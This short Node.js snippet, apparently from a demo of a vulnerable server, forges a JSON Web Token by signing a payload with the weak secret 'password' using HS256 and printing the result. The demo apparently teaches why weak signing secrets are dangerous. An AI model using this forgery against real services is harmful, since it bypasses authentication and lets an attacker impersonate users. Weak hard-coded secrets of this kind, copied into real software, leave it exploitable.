// Forge token using weak secret "password" (vulnerable server demo)
const jwt = require('jsonwebtoken');
const payload = { sub: '1', iss: 'example.auth', aud: 'example.api' };
const token = jwt.sign(payload, 'password', { algorithm: 'HS256', expiresIn: '1d' });
console.log("Forged JWT:\n", token);
